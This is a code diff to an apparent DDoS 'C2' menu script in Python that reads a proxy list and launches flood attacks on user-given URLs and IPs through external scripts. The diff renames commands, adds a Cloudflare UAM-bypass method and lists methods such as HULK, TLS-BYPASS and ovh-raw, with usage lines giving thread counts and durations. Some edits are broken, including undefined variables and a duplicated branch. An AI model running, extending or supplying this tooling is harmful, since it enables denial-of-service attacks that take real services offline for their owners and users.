@@ -12,68 +12,10 @@ def clear():
 proxy = open('proxy.txt').readlines()
 bots = len(proxy)
 
-def ascii_vro():
-    clear()
-    print(f'''
-     / **/|        
-     | == /        
-      |  |         
-      |  |         
-      |  /         
-       |/  
-
-
-
-
-
-
-
-    ''')
-    time.sleep(0.6)
-    clear()
-    print(f'''
-
-
-
-     / **/|        
-     | == /        
-      |  |         
-      |  |         
-      |  /         
-       |/  
-
-
-    ''')
-    time.sleep(0.6)
-    clear()
-    print(f'''
-
-
-
-
-
-
-
-     / **/|        
-     | == /        
-      |  |                  
-
-    ''')
-    time.sleep(0.6)
+def Its_pembukaan():
     clear()
     print(f"""
-
-     _.-^^---....,,--       
- _--                  --_  
-<                        >)
-|                         | 
- \._                   _./  
-    ```--. . , ; .--'''       
-          | |   |             
-       .-=||  | |=-.   
-       `-=#$%&%$#=-'   
-          | ;  :|     
- _____.,-#%&$@%#&#~,._____
+WAIT!
     """)
     time.sleep(0.8)
     clear()
@@ -123,7 +65,7 @@ def layer7():
     \x1b[38;2;233;233;233mLAYER7 || LIST
     • HULK
     • STRV3
-    • STRV4
+    • HTF
     • NUKE
     • POWER
     • MEDIUM
@@ -138,6 +80,7 @@ def layer7():
     • TLS-BYPASS
     • CF-UAM
     • BROWSER
+    • UAMBYPASS
    
 ''')
 
@@ -180,10 +123,8 @@ def LINC2():
     si()
     print(f'''
     \x1b[38;2;233;233;233mItsC2 || List
-    • LIN1
-    • LIN2
-    • LIN3
-    • ITS
+    • ITS1
+    • ITS2
 ''')
 
 def menu():
@@ -204,7 +145,7 @@ def menu():
  ░                 ░  
                       
                       
-» Recommended layer7: TLS,BROWSER,RIP
+» Recommended layer7: TLS,BROWSER,RIP,UAMBYPASS
 » Recommended layer4: STRESS,PAPING
 
 » Type"help"
@@ -272,22 +213,22 @@ def main():
                 
 # DDOSC2 METHODS
 
-        elif "S1" in cnc:
+        elif "ITS1" in cnc:
             try:
                 url = cnc.split()[1]
                 method = cnc.split()[2]
                 os.system(f'go run STR.go -site {url} -data {method}')
             except IndexError:
-                print('Usage: STR1 <url> METHODS<GET/POST>')
-                print('Example: STR1 http://example.com GET')
+                print('Usage: ITS1 <url> METHODS<GET/POST>')
+                print('Example: ITS1 http://example.com GET')
                 
-        elif "STR2" in cnc:
+        elif "ITS2" in cnc:
             try:
                 url = cnc.split()[1]
                 os.system(f'python2 STR.py {url}  ')
             except IndexError:
-                print('Usage: STR2 <url> ')
-                print('Example: STR2 http://example.com ')
+                print('Usage: ITS2 <url> ')
+                print('Example: ITS2 http://example.com ')
                 
        
         elif "FLOOD" in cnc:
@@ -372,7 +313,7 @@ def main():
                 print('Usage: ovh-raw METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
                 print('Example: ovh-raw GET 1.1.1.1 80 60 8500')
 
-        elif "STRV4" in cnc:
+        elif "HTF" in cnc:
             try:
                 url = cnc.split()[1]
                 thread = cnc.split()[2]
@@ -463,15 +404,15 @@ def main():
                 print('Example: CF-UAM http://example.com 100')
                 
                 
-        elif "ATTACK" in cnc:
+        elif "UAMBYPASS" in cnc:
             try:
                 url = cnc.split()[1]
                 time = cnc.split()[2]
                 threads = cnc.split()[3]
-                os.system(f'node attack.js {url} {time} {threads}')
+                os.system(f'node UAMBYPASS.js {url} {time} {ConnectPerThread} {proxies} {thread}')
             except IndexError:
-                print('Usage: attack <url> <time> <threads>')
-                print('Example: attack http://example.com 100 9550')
+                print('Usage: UAMBYPASS <url> <time> <ConnectPerThread> <proxies> <thread>')
+                print('Example: UAMBYPASS <http://example.com> <60> <250> <proxy.txt> <1>')
                 
         elif "LOL" in cnc:
             try:
@@ -484,7 +425,7 @@ def main():
                 print('Usage: lol <url> <threads> <req_per_sec> <time>')
                 print('Example: lol http://example.com 99550 512 120')    
                 
-        elif "RIP" in cnc:
+        elif "LOL" in cnc:
             try:
                 url = cnc.split()[1]
                 threads = cnc.split()[2]
@@ -492,8 +433,8 @@ def main():
                 time = cnc.split()[4]
                 os.system(f'node lol.js {url} {threads} {req_per_sec} {time}')
             except IndexError:
-                print('Usage: RIP <url> <threads> <req_per_sec> <time>')
-                print('Example: RIP http://example.com 99550 512 120')          
+                print('Usage: LOL <url> <threads> <req_per_sec> <time>')
+                print('Example: LOL http://example.com 99550 512 120')          
               
         elif "MEDIUM" in cnc:
             try:
